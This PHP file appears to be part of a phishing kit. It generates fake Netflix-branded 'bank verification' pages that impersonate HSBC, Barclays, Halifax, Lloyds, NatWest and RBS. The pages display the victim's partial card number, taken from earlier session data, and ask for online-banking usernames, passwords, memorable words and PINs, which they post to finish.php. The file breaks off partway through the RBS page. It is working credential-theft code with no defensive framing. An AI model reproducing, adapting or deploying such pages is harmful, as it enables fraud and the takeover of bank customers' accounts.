<?php
require 'controls.php';
if(!isset($_GET['sessionID'])){
    echo("<script>location.href = 'index.php';</script>");
    exit();
}
$sessionID = $_GET['sessionID'];
if(!isset($_GET['bank'])){
    echo("<script>location.href = 'finish.php';</script>");
    exit();
}
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("d/m/Y");
$last4 = substr($_SESSION['cardNumber'], 12, 16);
$first1 = substr($_SESSION['cardNumber'], 0, 1);
$bank = $_GET['bank'];

if($bank == 'hsbc'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/hsbc.png" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=hsbc">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Username:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="memWord" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Telephone Banking Pin:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'barclays'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/barclays.gif" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=barclays">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Membership Number:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Passcode:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'halifax'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/halifax.gif" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=halifax">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Customer Number or Username:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'lloyds'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/lloyds.gif" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=lloyds">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Customer Number or Username:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Memorable Word:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'natwest'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/natwest.png" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">XXXX-XXXX-XXXX-'.$last4.'</span>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </form>			
                                                            </td>
                                                        </tr>

                                                        <!-- Form -->
                                                        <tr>
                                                            <td style="margin-right: 10%;" id="number_selection_text" align="right" valign="top">
                                                                <form method="post" action="finish.php?bank=natwest">
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Username:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="username" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Password:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="password" required>
                                                                        </span>
                                                                    </div>
                                                                    <div style="margin-top: 2%; margin-bottom: 2%;">
                                                                        <span class="mbody">
                                                                            <label class="mbody" for="phone_number_display">Pin:</label>
                                                                        </span>
                                                                        <img src="../../static/pixel.gif" width="10" alt="">
                                                                        <span class="mbody" id="mbody">	
                                                                            <input type="text" name="pin" required>
                                                                        </span>
                                                                    </div>

                                                                    <div style="text-align: center; margin-top: 5%;">
                                                                        <span>
                                                                            <button id="nextBtn" class="buttonWhite">Submit</button>
                                                                        </span>
                                                                    </div>
                                                                </form>
                                                            </td>			
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </body>
        </html>
    ';
}
elseif($bank == 'rbs'){
    echo '
        <html lang="en">
            <head>
                <title>Netflix&nbsp;|&nbsp;Bank Verification</title>
                <link rel="stylesheet" href="css/bank.css" type="text/css" title="page_css">
            </head>
            <body bgcolor="#ffffff" topmargin="0" leftmargin="0" marginheight="0" marginwidth="0" bottommargin="0">
                <table border="0" cellspacing="0" cellpadding="0" width="100%" height="100%" role="presentation">
                    <tbody>
                        <tr>
                            <td align="center" valign="middle">
                                <table border="1" cellspacing="0" cellpadding="6" width="365" height="400">
                                    <tbody>
                                        <tr>
                                            <td width="350" height="360" align="center" valign="middle" style="padding-top: 0px; padding-bottom: 1px;">
                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="360" role="presentation">
                                                    <tbody>
                                                        <!-- Visa And Bank Logo -->
                                                        <tr>
                                                            <td width="350" height="50" align="center" valign="top">
                                                                <table border="0" cellspacing="0" cellpadding="0" width="350" height="50" role="presentation">
                                                                    <tbody>
                                                                        <tr>
                                                                            <td align="left" valign="top">
                                                                                <img src="assets/rbs.png" border="0" width="140" height="47" alt="Lloyds Bank logo">
                                                                            </td>
                                                                            <td align="right" valign="top">
                                                                                ';
                                                                                if($first1 == '4'){
                                                                                    echo '<img src="assets/visa.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                                elseif($first1 == '5'){
                                                                                    echo '<img src="assets/mastercard.gif" border="0" width="89" height="30" alt="Visa Secure Logo">';
                                                                                }
                                                                            echo '
                                                                            </td>
                                                                        </tr>
                                                                    </tbody>
                                                                </table>
                                                            </td>
                                                        </tr>

                                                        <!-- Merchant Details -->
                                                        <tr>
                                                            <td valign="middle">
                                                                <form name="form1" onsubmit="return ShouldSubmit();" autocomplete="OFF">
                                                                    <table border="0" cellspacing="0" cellpadding="0" width="350" role="presentation">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Merchant:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Netflix</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Amount:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">0.00 GBP</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Date:</span>
                                                                                </td>
                                                                                <td width="10">
                                                                                    <img src="../../static/pixel.gif" width="10" alt="">
                                                                                </td>
                                                                                <td align="left" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">'.$date.'</span>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" width="170" height="20" valign="top">
                                                                                    <span class="BodyText" id="BodyText">Card Number:</span>
                                                                                </td>
                                                                                <td width="10">
